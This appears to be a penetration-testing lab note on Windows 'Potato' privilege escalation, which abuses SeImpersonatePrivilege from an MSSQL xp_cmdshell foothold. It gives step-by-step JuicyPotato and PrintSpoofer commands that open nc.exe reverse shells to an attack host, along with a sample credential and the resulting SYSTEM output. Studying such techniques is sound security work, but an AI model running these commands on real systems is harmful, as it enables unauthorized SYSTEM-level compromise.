# SeImpersonate / SeAssignPrimaryToken — Potato Attacks

## Background

### What Are Tokens?
- Every Windows process has a **token** containing info about the account running it.
- Tokens are **not secure resources** by design — they're just memory locations, theoretically accessible by anyone who can read memory.
- Using another process's token requires the **`SeImpersonate`** privilege.
- Normally reserved for administrative/service accounts; often stripped during system hardening.
- Example legitimate API: `CreateProcessWithTokenW`.

### Legitimate Use Case
- Programs impersonate another process's token to escalate from **Administrator → Local System** (more privileges).
- Typically done by calling **WinLogon** to obtain a SYSTEM token, then re-executing themselves with it.

### Attacker Abuse — "Potato Style" Attacks
- Targets service accounts that have `SeImpersonate` but **not** full SYSTEM privileges.
- **Core trick:** deceive a SYSTEM-level process into connecting to an attacker-controlled process, which then captures/uses the handed-over SYSTEM token.

### When You'll Encounter This
Commonly found after gaining RCE via a service account context, e.g.:
- Webshell on an ASP.NET application
- RCE through Jenkins
- Command execution via MSSQL (`xp_cmdshell`)

> **Always check for `SeImpersonatePrivilege` immediately after gaining this type of foothold** — it's frequently a fast, easy path to elevated privileges.

---

## Exploitation Example — JuicyPotato (via MSSQL)

### Scenario
- Foothold gained on a SQL Server via a privileged SQL user (`sql_dev:Str0ng_P@ssw0rd!`), obtained from a `logins.sql` file found via Snaffler.

### Step 1 — Connect via Impacket's mssqlclient.py
```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

### Step 2 — Enable xp_cmdshell
```sql
enable_xp_cmdshell
```
(Impacket automatically issues the `RECONFIGURE` needed.)

### Step 3 — Confirm current context
```sql
xp_cmdshell whoami
```
```
nt service\mssql$sqlexpress01
```

### Step 4 — Check privileges
```sql
xp_cmdshell whoami /priv
```
Key finding:
```
SeImpersonatePrivilege        Impersonate a client after authentication  Enabled
```
- Confirms the service account can be exploited via **JuicyPotato** (abuses `SeImpersonate`/`SeAssignPrimaryToken` via DCOM/NTLM reflection).

### Step 5 — Prep and run JuicyPotato
Upload `JuicyPotato.exe` and `nc.exe` to the target; start a Netcat listener on the attack box (port 8443).

```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

**Flag reference:**
| Flag | Meaning |
|---|---|
| `-l` | COM server listening port |
| `-p` | Program to launch (`cmd.exe`) |
| `-a` | Arguments passed to that program |
| `-t` | CreateProcess call mode (`*` = try both `CreateProcessWithTokenW` and `CreateProcessAsUser`, covering both `SeImpersonate` and `SeAssignPrimaryToken`) |

### Step 6 — Catch the SYSTEM shell
```bash
nc -lnvp 8443
```
```
C:\Windows\system32>whoami
nt authority\system
```

---

## PrintSpoofer / RoguePotato (Modern OS Bypass)

⚠️ **JuicyPotato does not work on Windows Server 2019 or Windows 10 build 1809+.**

Alternatives that abuse the same underlying privileges on modern hosts:
- **PrintSpoofer**
- **RoguePotato**

### Exploitation Example — PrintSpoofer

Same MSSQL foothold, connect via `mssqlclient.py`, then run:
```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
Output:
```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

**Catch the shell:**
```bash
nc -lnvp 8443
```
```
C:\Windows\system32>whoami
nt authority\system
```

**Other PrintSpoofer capabilities:**
- Spawn a SYSTEM process directly in your current console
- Spawn a SYSTEM process on the desktop (if logged in locally/RDP)
- Catch a reverse shell (as shown above)

---

## Key Takeaway

| Tool | Best for |
|---|---|
| **JuicyPotato** | Older Windows (pre–Server 2019 / pre–Win10 1809) |
| **PrintSpoofer** | Windows 10 / Server 2019+ |
| **RoguePotato** | Alternative for modern OS when PrintSpoofer isn't viable |

`SeImpersonatePrivilege` abuse via "Potato" attacks is one of the **most common** Windows service-account privesc paths. Always check `whoami /priv` immediately after landing in a service account context, and select the right Potato variant based on target OS version.